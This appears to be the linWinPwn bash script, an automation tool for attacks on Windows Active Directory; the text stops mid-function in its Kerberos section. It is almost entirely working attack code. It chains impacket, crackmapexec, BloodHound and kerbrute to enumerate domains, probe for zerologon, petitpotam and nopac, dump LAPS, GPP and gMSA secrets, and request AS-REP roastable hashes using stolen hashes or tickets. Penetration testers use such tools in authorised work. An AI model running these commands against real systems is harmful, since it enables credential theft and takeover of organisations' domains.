#!/bin/bash
#
# linWinPwn - alpha version (https://github.com/lefayjey/linWinPwn)
# Author: lefayjey
# Inspired by: S3cur3Th1sSh1t's WinPwn (https://github.com/S3cur3Th1sSh1t/WinPwn)
# Latest update : 19/01/2022
#
#      _        __        ___       ____                 
#     | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __  
#     | || | '_ \\ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
#     | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | |
#     |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
#  --> Automate some internal Penetration Testing processes
#
#

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

#Default variables
user="guest"
password=""
modules="ad_enum,kerberos"
output_dir="/tmp"
pass_list="/usr/share/wordlists/rockyou.txt"
users_list="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
lsassy_bool=true

#Tools variables
impacket_dir="/usr/local/bin"
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
crackmapexec=$(which crackmapexec)
john=$(which john)
smbmap=$(which smbmap)
nmap=$(which nmap)
lsassy=$(which lsassy)
kerbrute=$(which kerbrute)
adidnsdump=$(which adidnsdump)
scripts_dir="."

help_linWinPwn () {
    echo -e "${YELLOW}Usage (default) ${NC}"
    echo -e "./$(basename "$0") -t dc_ip_or_target_domain" >&2;
    echo -e "./$(basename "$0") -d domain -u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket) -t dc_ip_or_target_domain" >&2;
    echo -e ""
    echo -e "${YELLOW}Usage (run user modules) ${NC}"
    echo -e "./$(basename "$0") -M user -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip_or_target_domain -o output_dir" >&2;
    echo -e ""
    echo -e "${YELLOW}Usage (run Password Dump - requires admin rights) ${NC}"
    echo -e "./$(basename "$0") -M pwd_dump -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip_or_target_domain -o output_dir [-L]" >&2; 
    echo -e ""
    echo -e "${YELLOW}Usage (run all modules) ${NC}"
    echo -e "./$(basename "$0") -M all -d domain [-u user -p password_or_hash(LM:NT)_or_kerbticket(./krb5cc_ticket)] -t dc_ip_or_target_domain -o output_dir [-L]" >&2; 
    echo -e ""
    echo -e "" 
    echo -e "Optional parameters"
    echo -e "Use -U to override default username list during anonymous checks"
    echo -e "Use -P to override default password list during password cracking"
    echo -e "Use -S to override default servers list during password dumping"
    echo -e "Use -L with pwd_dump to skip execution of lsassy"

}

while getopts ":d:u:p:t:M:o:U:P:S:Lh" opt; do
  case $opt in
    d) domain="${OPTARG}";;
    u) user="${OPTARG}";; #leave empty for anonymous login
    p) password="${OPTARG}";; #password or NTLM hash or location of krb5cc ticket
    t) dc_ip="${OPTARG}";; #mandatory
    M) modules="${OPTARG}";; #comma separated modules to run
    o) output_dir="${OPTARG}";;
    L) lsassy_bool=false;;
    U) users_list="${OPTARG}";;
    P) pass_list="${OPTARG}";;
    S) servers_list="${OPTARG}";;
    h) help_linWinPwn; exit;;
    \?) echo -e "Unknown option: -${OPTARG}" >&2; exit 1;;
  esac
done

main () {
    echo -e "${YELLOW}[####### START #######] $(date) ${NC}"
    echo -e ""

    prepare

    for i in $(echo $modules | sed "s/,/ /g"); do
        case $i in
            ad_enum)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            ;;

            kerberos)
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            ;;

            scan_servers)
            echo -e "${GREEN}[##### SMB Shares and RPC Scan #####]${NC}"
            scan_servers
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            ;;

            pwd_dump)
            echo -e "${GREEN}[##### Password Dump #####]${NC}"
            pwd_dump
            echo -e "${GREEN}---------------------------${NC}"
            echo -e ""
            ;;

            all)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### SMB Shares and RPC Scan #####]${NC}"
            scan_servers
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Password Dump #####]${NC}"
            pwd_dump
            echo -e "${GREEN}---------------------------${NC}"
            echo -e ""
            ;;

            user)
            echo -e "${GREEN}[##### Active Directory Enumeration #####]${NC}"
            ad_enum
            echo -e "${GREEN}------------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### Kerberos-based Attacks #####]${NC}"
            kerberos
            echo -e "${GREEN}------------------------------------${NC}"
            echo -e ""
            echo -e "${GREEN}[##### SMB Shares and RPC Scan #####]${NC}"
            scan_servers
            echo -e "${GREEN}-----------------------------${NC}"
            echo -e ""
            ;;

            *)
            echo -e "${RED}[### FAIL ###] Unknown module $i... ${NC}"
            echo -e ""
            ;;
        esac
    done

    echo -e "${YELLOW}[####### END #######] Output folder is $(realpath $output_dir)${NC}"
}

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[### FAIL ###] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${CYAN}[### FAIL ###] Please run setup.sh and try again... ${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}

    if [ -z "$domain" ] ; then
        domain=${dc_domain}
    fi

    echo -e "${YELLOW}[##### INFO #####] Domain Controller's FQDN: ${dc_FQDN} ${NC}"

    anon_bool=false
    hash_bool=false
    kerb_bool=false

    #Check if anonymous authentication is used
    if [ "${password}" == "" ] ; then
        anon_bool=true
        echo -e "${YELLOW}[##### INFO #####] Authentication: anonymous login or empty password ${NC}"
        echo -e "${YELLOW}[##### INFO #####] Target domain: ${dc_domain} ${NC}"
        echo -e ""

    #Check if NTLM hash is used, and complete with empty LM hash
    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
        hash_bool=true
        hash=$password
        if [ "$(echo $hash | cut -d ":" -f 1)" == "" ]; then
            hash="aad3b435b51404eeaad3b435b51404ee"$hash
        fi
        echo -e "${YELLOW}[##### INFO #####] Authentication: NTLM hash of ${user} ${NC}"
        echo -e "${YELLOW}[##### INFO #####] Target domain: ${dc_domain} ${NC}"
        echo -e ""

    #Check if kerberos ticket is used
    elif [ -f "${password}" ] ; then
        kerb_bool=true
        kerb_ticket=$password
        export KRB5CCNAME=$kerb_ticket
        echo -e "${YELLOW}[##### INFO #####] Authentication: Kerberos Ticket of $user located at $kerb_ticket ${NC}"
        echo -e "${YELLOW}[##### INFO #####] Target domain: ${dc_domain} ${NC}"
        echo -e ""
    else
        echo -e "${YELLOW}[##### INFO #####] Authentication: password of ${user} ${NC}"
        echo -e "${YELLOW}[##### INFO #####] Target domain: ${dc_domain} ${NC}"
        echo -e ""
    fi

    echo -e "${YELLOW}[##### INFO #####] Running modules: ${modules} ${NC}"

    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDump
    mkdir -p ${output_dir}/Kerberoast
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Scans/SMBDump

    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"

    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    elif [ ! -f "${dns_records}" ];  then
        echo -e "${BLUE}[### START ###] DNS dump using adidnsdump${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] adidnsdump requires credentials${NC}"
            echo ${dc_ip} >> ${servers_ip_list}
        elif [ "${hash_bool}" == true ] ; then 
            ${adidnsdump} -u ${domain}\\${user} -p ${hash} --dns-tcp ${dc_ip}
            mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] adidnsdump does not support kerberos tickets${NC}"
            echo ${dc_ip} >> ${servers_ip_list}
        else
            ${adidnsdump} -u ${domain}\\${user} -p ${password} --dns-tcp ${dc_ip}
            mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${servers_ip_list}
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "dc\|dns" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${dc_ip_list}
            cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv | grep -i "db\|sql" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> ${sql_ip_list}
        fi
        echo -e "${BLUE}[### END ###] DNS dump using adidnsdump${NC}"
        echo -e ""
    else
        echo -e "${YELLOW}[### SKIP ###] DNS dump found ${NC}"
        echo -e ""
    fi 
    sort -u ${servers_ip_list} > ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt
    mv ${output_dir}/DomainRecon/ip_list_sorted_${dc_domain}.txt ${servers_ip_list}
}

ad_enum () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of bloodhound${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] BloodHound enum${NC}"
        current_dir=$(pwd)
        mkdir -p ${output_dir}/DomainRecon/BloodHound/${dc_domain}
        cd ${output_dir}/DomainRecon/BloodHound/${dc_domain}
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] BloodHound requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
            ${bloodhound} -d ${dc_domain} -u "${user}@${domain}" --hashes ${hash} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        elif [ "${kerb_bool}" == true ] ; then
            ${bloodhound} -d ${dc_domain} -u "${user}@${domain}" -k -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        else
            ${bloodhound} -d ${dc_domain} -u "${user}@${domain}" -p ${password} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 15 --dns-tcp
        fi
        cd ${current_dir}
        echo -e "${BLUE}[### END ###] BloodHound enum${NC}"
        echo -e ""
    fi

    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of ldapdomaindump${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] ldapdomain enum${NC}"
        mkdir -p ${output_dir}/DomainRecon/LDAPDump/${dc_domain}
        if [ "${anon_bool}" == true ] ; then
            ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump/${dc_domain} 2>/dev/null
        elif [ "${hash_bool}" == true ] ; then 
            ${ldapdomaindump} -u ${domain}\\${user} -p ${hash} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump/${dc_domain} 2>/dev/null
        elif [ "${kerb_bool}" == true ] ; then
                echo -e "${YELLOW}[### SKIP ###] ldapdomain does not support kerberos tickets${NC}"
        else
            ${ldapdomaindump} -u ${domain}\\${user} -p ${password} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump/${dc_domain} 2>/dev/null
        fi
        echo -e "${BLUE}[### END ###] ldapdomain enum${NC}"
        echo -e ""

        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldap_${dc_domain}.txt 2>&1

        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of crackmapexec${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] crackmapexec enum${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] rid brute ${NC}"
            ${crackmapexec} smb ${dc_ip} -u ${user} -p "" --rid-brute > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
            /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2| sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1         
            echo -e "${CYAN}[# Start #] users enum ${NC}"
            ${crackmapexec} smb ${dc_ip} -u "" -p "" --users > ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt
            /bin/cat ${output_dir}/DomainRecon/users_nullsess_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1         
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${dc_ip} -u '' -p '' -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] petitpotam check ${NC}"
            ${crackmapexec} smb ${dc_ip} -u '' -p '' -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] zerologon check ${NC}"
            ${crackmapexec} smb ${dc_ip} -u '' -p '' -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] mssql_priv check ${NC}"
            ${crackmapexec} mssql ${sql_ip_list} -u '' -p ''  -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
        elif [ "${hash_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M webdav | tee ${output_dir}/DomainRecon/cme_webdav_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] nopac check ${NC}"
            ${crackmapexec} smb ${dc_ip_list} -d ${domain} -u ${user} -H ${hash} -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] petitpotam check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] zerologon check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] laps dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] adcs check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] users description dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M get-desc-users --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] get MachineAccountQuota ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] ldap-signing check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -H ${hash} -M ldap-signing --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] mssql_priv check ${NC}"
            ${crackmapexec} mssql ${sql_ip_list} -d ${domain} -u ${user} -H ${hash} -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
       elif [ "${kerb_bool}" == true ] ; then
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -k -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -k -M webdav | tee ${output_dir}/DomainRecon/cme_webdav_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] nopac check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] petitpotam check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] zerologon check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p '' -k -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] laps dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] adcs check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] users description dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M get-desc-users --kdcHost ${dc_domain} | tee${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] get MachineAccountQuota ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] ldap-signing check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p '' -k -M ldap-signing --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] mssql_priv check ${NC}"
            ${crackmapexec} mssql ${sql_ip_list} -d ${domain} -u ${user} -p '' -k -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
        else
            echo -e "${CYAN}[# Start #] spooler check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M spooler | tee ${output_dir}/DomainRecon/cme_spooler_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] webdav check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M webdav | tee ${output_dir}/DomainRecon/cme_webdav_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] nopac check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M nopac | tee ${output_dir}/DomainRecon/cme_nopac_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] petitpotam check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M petitpotam | tee ${output_dir}/DomainRecon/cme_petitpotam_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] zerologon check ${NC}"
            ${crackmapexec} smb ${dc_ip} -d ${domain} -u ${user} -p ${password} -M zerologon | tee ${output_dir}/DomainRecon/cme_zerologon_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] laps dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M laps --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] adcs check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M adcs --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] users description dump ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M get-desc-users --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_get-desc-users_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] get MachineAccountQuota ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M MAQ --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] ldap-signing check ${NC}"
            ${crackmapexec} ldap ${dc_ip} -d ${domain} -u ${user} -p ${password} -M ldap-signing --kdcHost ${dc_domain} | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[# Start #] mssql_priv check ${NC}"
            ${crackmapexec} mssql ${sql_ip_list} -d ${domain} -u ${user} -p ${password} -M mssql_priv | tee ${output_dir}/DomainRecon/cme_mssql_priv_output_${dc_domain}.txt 2>&1
        fi
        echo -e "${BLUE}[### END ###] crackmapexec enum${NC}"
        echo -e ""
    fi

    if [[ ! -f "${impacket_dir}/findDelegation.py" ]] && [[ ! -f "${impacket_dir}/Get-GPPPassword.py)" ]] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] impacket enum${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] impacket requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -hashes ${hash} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}@${dc_ip} -k -no-pass | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
        else
            /usr/bin/python3 ${impacket_dir}/Get-GPPPassword.py ${domain}/${user}:${password}@${dc_ip} | tee ${output_dir}/DomainRecon/impacket_Get-GPPPassword_output_${dc_domain}.txt
            /usr/bin/python3 ${impacket_dir}/findDelegation.py ${domain}/${user}:${password} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
        fi
        if [ "${anon_bool}" == false ] ; then
            if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                echo -e "${RED}[### FAIL ###] Errors during Delegation enum... ${NC}"
            fi
        fi
        echo -e "${BLUE}[### END ###] impacket enum${NC}"
        echo -e ""
    fi

    if [ ! -f "${scripts_dir}/gMSADumper.py" ] ; then
        echo -e "${YELLOW}[### SKIP ###] Please verify the location of gMSADumper.py${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] gMSA Dump${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[### SKIP ###] gMSA Dump requires credentials${NC}"
        elif [ "${hash_bool}" == true ] ; then 
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${hash} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -k 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
        else
            /usr/bin/python3 ${scripts_dir}/gMSADumper.py -d ${domain} -u ${user} -p ${password} -l ${dc_ip} 2>/dev/null > ${output_dir}/DomainRecon/gMSA_dump_${dc_domain}.txt
        fi
        echo -e "${BLUE}[### END ###] gMSA Dump${NC}"
        echo -e ""
    fi
}

kerberos () {
    if [ ! -f "${kerbrute}" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of kerbrute${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] kerbrute Usernames${NC}"
        if [ "${anon_bool}" == true ] ; then
            echo -e "${YELLOW}[##### INFO #####] Using $users_list wordlist for user enumeration ... ${NC}"
            ${kerbrute} -users ${users_list} -domain ${dc_domain} -dc-ip ${dc_ip} -no-save-ticket -outputusers ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt | tee ${output_dir}/Kerberoast/kerbrute_output_${dc_domain}.txt 2>&1
        fi
        echo -e "${BLUE}[### END ###] kerbrute Usernames${NC}"
        echo -e ""
    fi

    if [ ! -f "${impacket_dir}/GetNPUsers.py" ] ;  then
        echo -e "${YELLOW}[### SKIP ###] Please verify the installation of impacket${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[### START ###] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${anon_bool}" == true ] ; then
            known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
            /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf | tee ${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt 2>&1
            if [ -s "${known_users_list}" ] ;  then
                users_list=${known_users_list}
            fi
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${dc_domain}/ -usersfile ${users_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt 2>&1
        elif [ "${hash_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -dc-ip ${dc_ip}
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -hashes ${hash} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberoast/asreproast_output_${dc_domain}.txt
        elif [ "${kerb_bool}" == true ] ; then
            /usr/bin/python3 ${impacket_dir}/GetNPUsers.py ${domain}/${user} -k -no-pass -dc-ip ${dc_ip}        
